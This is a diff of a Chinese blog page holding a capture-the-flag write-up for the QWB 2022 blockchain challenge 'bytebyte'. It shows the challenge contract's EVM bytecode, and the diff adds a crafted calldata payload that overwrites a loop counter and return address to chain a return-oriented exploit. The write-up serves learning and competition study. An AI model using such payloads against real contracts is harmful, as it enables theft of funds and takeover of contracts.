@@ -86,7 +86,7 @@
 <meta property="og:description" content="前言  第六届 qwb 线下赛 bytebyte 赛题 WP 恭喜中国科学技术大学师傅一血 考点是 Return Oriented Programming revenge of EGM，堆栈细节可参考 https://hitcxy.com/2020/egm/ 相比于 EGM ，bytebyte 调整了循环变量的位置，循环变量是个范围，按照个人的构思，如果 calldata 长度是 4+32*11">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/qwb2022/1.png">
-<meta property="og:updated_time" content="2022-08-03T14:27:18.783Z">
+<meta property="og:updated_time" content="2022-08-03T14:32:30.412Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="qwb2022 第六届强网杯线上赛区块链 bytebyte">
 <meta name="twitter:description" content="前言  第六届 qwb 线下赛 bytebyte 赛题 WP 恭喜中国科学技术大学师傅一血 考点是 Return Oriented Programming revenge of EGM，堆栈细节可参考 https://hitcxy.com/2020/egm/ 相比于 EGM ，bytebyte 调整了循环变量的位置，循环变量是个范围，按照个人的构思，如果 calldata 长度是 4+32*11">
@@ -378,7 +378,7 @@
               
                 <span class="post-meta-item-text">更新于</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2022-08-03T22:27:18+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2022-08-03T22:32:30+08:00">
                 2022-08-03
               </time>
             
@@ -434,10 +434,10 @@
              <i class="fa fa-edit"></i>
            </span>
            <span class="post-meta-item-text">WordCount:</span>
-           <span class="post-count">329字</span>
+           <span class="post-count">393字</span>
 			<span class="post-meta-divider">|</span>
 			<span class="post-meta-item-text">min2read:</span>
-           <span class="post-count">1分钟</span>
+           <span class="post-count">2分钟</span>
 
          </span>
 
@@ -467,9 +467,13 @@
 <a id="more"></a>
 <h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6210000060405260043610610073576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680638d715d9d1461024557806360fe47b11461031a5780636d4ce63c1461035557806335f4699414610372578063b4a99a4e1461038157610073565b610078565b600080fd600060006000600060005b61012061010052565b6101005190565b60206101005101806101005252565b6101005151602061010051036101005290565b61010052565b6100ca610100516100975b565b565b6100d66100a6565b6100de6100a6565b6100e7906100b9565b565b6100f1610087565b565b34156100cc57610078565b6101086000610097565b5b7f01000000000000000000000000000000000000000000000000000000000000006101005151602061010051035101510415610152575b60016101005151016101005152610109565b61015a6100a6565b6101626100a6565b506100ce565b6103916101406097565b5b6020610100510351610100515103156101d9577f0100000000000000000000000000000000000000000000000000000000000000610100515160606101005103510151046101005151604061010051035101535b60016101005151016101005152610391565b60006101005151604061010051035101535b60406101005151061561021c5760006101005151604061010051035101535b600161010051510161010051526101eb565b6102246100a6565b5061022d6100a6565b506102366100a6565b5061023f6100a6565b506100ce565b61024d6100e9565b6102576000610097565b610100516102656212345650565b36602462013000376102756100bf565b61028061034f610097565b61028c62013000610097565b61029534610097565b6102a160243603610097565b610168565b6102ae6100bf565b6102b96102c7610097565b6102c281610097565b6100fe565b6020610100510381602060408303526020820352602060208203510660208203510360200160400160408203f35b610100515160206101005103515561030b6100a6565b506103146100a6565b506100ce565b6103226100f3565b61032a6100bf565b61033561034f610097565b610340600435610097565b61034a6000610097565b6102f5565b60006000f35b61035d6100f3565b60005433146100785760005460805260206080f35b60665433141561007857606654ff5b6066543314156100785733606655005b604061010051035160206101005103510315610403577f0100000000000000000000000000000000000000000000000000000000000000604061010051035160606101005103510151046101005151604061010051035101535b60016040610100510351016040610100510352610391565b600061010051516040610100510351015360406040610100510351061561021c5760006101005151604061010051035101535b60016040610100510351016040610100510352610415565b505050505050505050505050505050505050505050505050505050505050505050505050505050</span><br></pre></td></tr></table></figure>
 <h3 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h3><ul>
-<li>题目会将 <code>calldata[24:]</code> 拷贝到 <code>0x140</code> 位置，其中 <code>0x9f</code> 是循环计数器是个变量，既要覆盖 0x2f5（返回的栈帧位置），又要满足拷贝的循环正常终止，所以是个范围值，所以题目设置的最小的 <code>calldata</code> 如下</li>
+<li>题目会将 <code>calldata[24:]</code> 拷贝到 <code>0x140</code> 位置，其中 <code>0x9f</code> 是循环计数器是个变量，既要覆盖 <code>0x2f5</code>（返回的栈帧位置），又要满足拷贝的循环正常终止，所以是个范围值，所以题目设置的最小的 <code>calldata</code> 如下（比较大小会将 msg.sender 设置为0，所以不影响）</li>
 </ul>
 <p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/qwb2022/1.png" alt></p>
+<ul>
+<li>题目设置的最小的 <code>calldata</code> 如下</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data = &apos;0x8d715d9d&apos;</span><br><span class="line">data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;</span><br><span class="line">data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;</span><br><span class="line">data += &apos;0000000000000000000000000000000000000000000000000000000000000260&apos;</span><br><span class="line">data += &apos;00000000000000000000000000000000000000000000000000000000000002f5&apos;</span><br><span class="line">data += &apos;0000000000000000000000000000000000000000000000000000000000013000&apos;</span><br><span class="line">data += &apos;000000000000000000000000000000000000000000000000000000000000009f&apos;</span><br><span class="line">data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;</span><br><span class="line">data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;</span><br><span class="line">data += &apos;000000000000000000000000000000000000000000000000000000000000034f&apos;</span><br><span class="line">data += &apos;0000000000000000000000000000000000000000000000000000000000000066&apos;</span><br><span class="line">data += &apos;000000000000000000000000715e68C887512022164b9f3F28439e9d12FFF5e1&apos;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>一血队伍的 <code>calldata</code> 更短更巧妙，通过让循环计数器 i 覆盖为终止值的方式，使得循环计数器后面的数据不再会被用到，所以不需要避开它们，这时只要使用 <code>0x13000</code> 之后的 <code>offset</code> 就可以让 <code>ROP</code> 正常执行，于是可以节约两个数如下</li>
 </ul>
